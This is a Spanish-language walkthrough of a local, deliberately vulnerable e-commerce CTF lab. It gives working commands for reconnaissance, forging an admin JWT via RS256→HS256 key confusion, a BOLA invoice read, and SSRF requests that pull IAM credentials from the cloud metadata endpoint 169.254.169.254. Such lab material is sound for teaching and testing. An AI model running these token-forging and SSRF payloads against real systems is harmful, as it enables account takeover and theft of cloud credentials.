# NubeMarts CTF — Walkthrough Red Team (con herramientas)

> Laboratorio **intencionalmente vulnerable**. Uso educativo en entorno local
> aislado. La cadena completa simula un ataque real a una app de e-commerce en
> la nube: **OSINT → confusión de algoritmo JWT → BOLA → SSRF → robo de
> credenciales de metadata (IMDS)**.
>
> Esta guía prioriza el uso de **herramientas de red team** (Burp Suite,
> jwt_tool, ffuf, nuclei, nmap, SSRFmap, etc.). Al final de cada etapa hay una
> **verificación rápida con `curl`** por si querés confirmar el resultado sin
> el toolkit.

## Objetivos (flags)

| # | Vulnerabilidad | Flag |
|---|----------------|------|
| 1 | Broken Authentication (JWT Algorithm Confusion) | *(habilita el resto)* |
| 2 | BOLA (Broken Object Level Authorization) | `FLAG{BOLA_m3rch4nt_pwn3d}` |
| 3 | SSRF → AWS IMDS | `FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}` |

## Puesta en marcha del laboratorio

```bash
cd nube-marts-ctf
docker compose up --build
```

- Frontend: http://127.0.0.1:5173
- Backend (docs): http://127.0.0.1:8000/api/v1/docs

> En macOS `localhost` puede resolver a IPv6 (`::1`). Usá **`127.0.0.1`** para
> asegurarte de llegar al contenedor. El IMDS (`169.254.169.254`) **no** está
> publicado al host: solo se alcanza por la SSRF (Etapa 3), igual que en una
> instancia EC2 real.

---

## Kit de herramientas (setup)

| Herramienta | Uso en este lab | Instalación |
|-------------|-----------------|-------------|
| **Burp Suite** (Community/Pro) | Proxy, Repeater, Intruder, extensiones JWT Editor y Autorize | https://portswigger.net/burp |
| **jwt_tool** | Confusión de algoritmo RS256→HS256, tamper de claims | `git clone https://github.com/ticarpi/jwt_tool` |
| **ffuf** / **gobuster** | Descubrimiento de contenido y fuzzing | `brew install ffuf gobuster` |
| **nuclei** | Escaneo por templates (swagger expuesto, JWT, misconfig) | `brew install nuclei` |
| **nmap** | Descubrimiento de puertos/servicios | `brew install nmap` |
| **whatweb** | Fingerprint de tecnologías | `brew install whatweb` |
| **sourcemapper** | Reconstruir el código fuente desde `.js.map` | `go install github.com/denandz/sourcemapper@latest` |
| **SSRFmap** | Explotación automatizada de SSRF (módulo AWS/metadata) | `git clone https://github.com/swisskyrepo/SSRFmap` |
| **SecLists** | Diccionarios para fuzzing | `git clone https://github.com/danielmiessler/SecLists` |
| **jq** | Parsear respuestas JSON | `brew install jq` |

### Configurar Burp como proxy

1. Burp → *Proxy → Options*: listener en `127.0.0.1:8080` (por defecto).
2. Navegador con **FoxyProxy** apuntando a `127.0.0.1:8080` (o usar el
   navegador embebido de Burp: *Proxy → Intercept → Open Browser*).
3. Instalar el certificado CA de Burp (`http://burp/cert`) para ver HTTPS.
4. *Target → Scope*: agregá `127.0.0.1:5173` y `127.0.0.1:8000`. Activá
   *"Show only in-scope items"*.
5. Navegá la app logueado y deslogueado para poblar el **sitemap** de Burp.

---

## Etapa 0 — Reconocimiento (OSINT + escaneo)

Objetivo: mapear la superficie del backend **sin autenticación**.

### 0.1 Descubrimiento de puertos y tecnologías

```bash
# Puertos publicados por Docker en el host
nmap -sV -p 1-10000 127.0.0.1

# Fingerprint del frontend y del backend
whatweb http://127.0.0.1:5173
whatweb http://127.0.0.1:8000
```

Esperado: `5173` (Vite/React) y `8000` (Uvicorn/FastAPI). El IMDS no aparece
(está en la red interna Docker).

### 0.2 Descubrimiento de contenido (ffuf / gobuster)

```bash
# Rutas en la raíz del backend
ffuf -u http://127.0.0.1:8000/FUZZ \
  -w SecLists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,401,403

# Rutas bajo /api/v1 (con recursión)
ffuf -u http://127.0.0.1:8000/api/v1/FUZZ \
  -w SecLists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc all -fc 404

# Equivalente con gobuster
gobuster dir -u http://127.0.0.1:8000 \
  -w SecLists/Discovery/Web-Content/common.txt -s 200,301,302,401,403 -b ""
```

Hallazgos clave: **`/public.pem`**, **`/api/v1/docs`**,
**`/api/v1/swagger.json`**, **`/api/v1/stores`**.

### 0.3 Escaneo por templates (nuclei)

```bash
nuclei -u http://127.0.0.1:8000 \
  -t http/exposures/ -t http/misconfiguration/ -t http/technologies/
```

Detecta el **OpenAPI/Swagger expuesto** y la clave/archivos sensibles.

### 0.4 Reconstrucción de código fuente (source maps)

El build de Vite se sirve **sin minificar** y con **source maps**. Dos caminos:

**a) Servidor de desarrollo (este lab):** el código fuente se sirve directo.

```bash
curl -s http://127.0.0.1:5173/src/api.js
```

**b) Build de producción:** extraer el `.map` con *sourcemapper*.

```bash
# Ubicar el bundle y su sourcemap en el HTML / DevTools (pestaña Sources)
sourcemapper -url http://127.0.0.1:5173/assets/index-<hash>.js.map -output src_recuperado
grep -R "swagger\|public.pem\|UUID\|localhost:8000" src_recuperado
```

Dentro de `src/api.js` hay comentarios de desarrollo que filtran todo:

```
Backend base URL:            http://localhost:8000
OpenAPI / Swagger schema:    http://localhost:8000/api/v1/swagger.json
RSA public key (JWT verify): http://localhost:8000/public.pem
TODO(security): ... Pinturas del Sur UUID: a1b2c3d4-0000-0000-0000-000000000001
```

### 0.5 Enumerar merchants y descargar la clave

En **Burp Repeater** (o `curl`):

```bash
# UUIDs de todas las tiendas (útil para la Etapa 2)
curl -s http://127.0.0.1:8000/api/v1/stores | jq

# Clave pública RSA (pieza clave para la Etapa 1)
curl -s http://127.0.0.1:8000/public.pem -o public.pem
```

**Resultado del recon:** rutas sensibles, el UUID de "Pinturas del Sur"
(`a1b2c3d4-0000-0000-0000-000000000001`), los endpoints vulnerables y la clave
pública.

---

## Etapa 1 — JWT Algorithm Confusion (RS256 → HS256)

El backend firma con **RS256** (clave privada) y verifica con la **clave
pública**, pero **no fija el algoritmo**: acepta `HS256`. Como la clave pública
es descargable, se firma un token `HS256` usando el **PEM como secreto HMAC**.

### 1.1 Capturar un token base

Logueate en la UI (o por API) con el usuario de baja privilegios y capturá el
token en Burp (*Proxy → HTTP history*, request a `/api/v1/login`):

```bash
TOK=$(curl -s -X POST http://127.0.0.1:8000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hola@cafecentral.example","password":"espresso123"}' | jq -r .access_token)
echo "$TOK"   # token RS256, role=merchant
```

### 1.2 Opción A — jwt_tool (recomendada)

`jwt_tool` implementa la confusión de clave RSA→HMAC con `-X k` y permite
inyectar/alterar claims (`-I -pc <claim> -pv <valor>`):

```bash
cd jwt_tool
# Escala a admin + confusión de algoritmo firmando con la clave pública
python3 jwt_tool.py "$TOK" \
  -X k -pk ../public.pem \
  -I -pc role -pv admin -pc sub -pv attacker

# jwt_tool imprime el token forjado (alg=HS256). Guardalo:
export FORGED="<token que imprime jwt_tool>"
```

> `-X k` = *Key confusion (RSA/HMAC)*. Usa el contenido de `public.pem` como
> secreto HMAC, exactamente lo que el servidor usa como clave de verificación.

### 1.3 Opción B — Burp Suite (extensión JWT Editor)

1. *Extensions → BApp Store* → instalar **JWT Editor**.
2. Guardá el PEM: `curl -s http://127.0.0.1:8000/public.pem -o public.pem`.
3. *JWT Editor Keys → New RSA Key* → pegá el PEM (formato PEM) → OK.
4. Seleccioná esa clave → clic derecho → **Copy Public Key as PEM**.
5. Codificá ese PEM en **Base64** (pestaña *Decoder*).
6. *JWT Editor Keys → New Symmetric Key → Generate*; reemplazá el valor de
   `k` por el Base64 del PEM del paso anterior → OK.
7. Enviá una request autenticada a **Repeater**. En la pestaña **JSON Web
   Token**:
   - Cambiá el header `alg` a `HS256`.
   - Editá el payload: `"role":"admin"`.
   - Clic en **Sign** → elegí la *symmetric key* creada → opción
     **"Don't modify header"** → *OK*.
8. Enviá la request: el backend acepta el token forjado.

### 1.4 Verificación

```bash
curl -s http://127.0.0.1:8000/api/v1/me -H "Authorization: Bearer $FORGED" | jq
# -> {"sub":"attacker","role":"admin",...}
```

> Nota: PyJWT moderno **bloquea** usar un PEM como secreto HMAC en su función
> de firma; por eso se forja con jwt_tool/Burp (o HMAC manual), no con
> `jwt.encode()`. El secreto debe ser **exactamente** los bytes de
> `/public.pem` (incluido el salto de línea final).

---

## Etapa 2 — BOLA: leer facturas de cualquier merchant

`GET /api/v1/merchants/{merchant_uuid}/payout-invoices` exige `role: admin`
pero **no valida** que el `sub` del token coincida con el `merchant_uuid`.

### 2.1 Burp Repeater (manual)

Enviá a Repeater la request con tu token forjado y cambiá el UUID de la ruta
por el de "Pinturas del Sur":

```
GET /api/v1/merchants/a1b2c3d4-0000-0000-0000-000000000001/payout-invoices HTTP/1.1
Host: 127.0.0.1:8000
Authorization: Bearer <FORGED>
```

### 2.2 Burp Intruder (enumeración de UUIDs)

1. Enviá la request a **Intruder**.
2. Marcá el `{merchant_uuid}` como posición de payload (`§...§`).
3. En *Payloads* cargá los UUIDs obtenidos de `/api/v1/stores` (Etapa 0.5).
4. *Start attack* y ordená por longitud/estado de respuesta para hallar la
   tienda con la factura confidencial.

### 2.3 Burp Autorize (detección automática de BOLA)

1. Instalá la extensión **Autorize**.
2. Pegá en Autorize el header `Authorization` de un usuario **de baja
   privilegios** (o vacío).
3. Navegá/repetí las requests como admin: Autorize marca en **rojo/"Bypassed!"**
   los endpoints donde el usuario de menor privilegio también obtiene 200 —
   exactamente el caso de payout-invoices.

### 2.4 Verificación

```bash
curl -s -H "Authorization: Bearer $FORGED" \
  http://127.0.0.1:8000/api/v1/merchants/a1b2c3d4-0000-0000-0000-000000000001/payout-invoices | jq
```

En la factura `INV-SECRET`:

🚩 **Flag 2:** `FLAG{BOLA_m3rch4nt_pwn3d}`

---

## Etapa 3 — SSRF → servicio de metadata (IMDS)

`POST /api/v1/product/import` hace `requests.get(image_url)` sin validación y
devuelve el cuerpo crudo en `preview`. El backend está en la red interna
`ctf_internal`, donde vive el IMDS falso en `169.254.169.254`.

### 3.1 Burp Repeater (confirmar SSRF)

```
POST /api/v1/product/import HTTP/1.1
Host: 127.0.0.1:8000
Authorization: Bearer <FORGED>
Content-Type: application/json

{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

Respuesta: `{"preview":"role", ...}` → existe un rol.

### 3.2 SSRFmap (explotación automatizada)

Guardá la request anterior desde Burp (*Copy to file*) como `request.txt`
(con un `image_url` cualquiera como marcador) y lanzá el módulo AWS:

```bash
cd SSRFmap
# request.txt debe contener el header Authorization y el body JSON
python3 ssrfmap.py -r request.txt -p image_url -m aws
```

El módulo `aws` recorre `http://169.254.169.254/latest/meta-data/...` y extrae
las credenciales IAM automáticamente.

### 3.3 ffuf a través de la SSRF (port scan / rutas internas)

```bash
# Fuzzing de rutas del IMDS pivoteando por el backend
ffuf -u http://127.0.0.1:8000/api/v1/product/import -X POST \
  -H "Authorization: Bearer $FORGED" -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/FUZZ"}' \
  -w SecLists/Discovery/Web-Content/common.txt -mc all -fs 0
```

### 3.4 Robar las credenciales (verificación)

```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/product/import \
  -H "Authorization: Bearer $FORGED" -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}' | jq -r .preview
```

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA5EXAMPLE7NUBEMART",
  "SecretAccessKey": "FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}",
  "Token": "IQoJb3JpZ2luX2Vj..."
}
```

🚩 **Flag 3:** `FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}`

---

## Resumen de la cadena (kill chain)

```
[nmap/whatweb/ffuf/nuclei] ─► superficie del backend
[sourcemapper/DevTools]    ─► src/api.js filtra /public.pem, swagger, UUID
        │
        ▼
[jwt_tool -X k / Burp JWT Editor] ─► JWT HS256 con role=admin   (Etapa 1)
        │
        ├─► [Burp Repeater/Intruder/Autorize] BOLA  ─► FLAG{BOLA_m3rch4nt_pwn3d}
        │
        └─► [SSRFmap -m aws / Burp] SSRF→IMDS        ─► FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}
```

## Mapeo a estándares

| Etapa | OWASP Top 10 / API | Técnica MITRE ATT&CK |
|-------|--------------------|----------------------|
| 0 OSINT | A05 Misconfiguration | T1595 Active Scanning / T1592 |
| 1 JWT | API2 Broken Authentication | T1550 Use Alternate Auth Material |
| 2 BOLA | API1 Broken Object Level Auth | T1078 Valid Accounts |
| 3 SSRF | API7 SSRF | T1552.005 Cloud Instance Metadata API |

Para las contramedidas de cada punto, ver **`REMEDIACION.md`**.
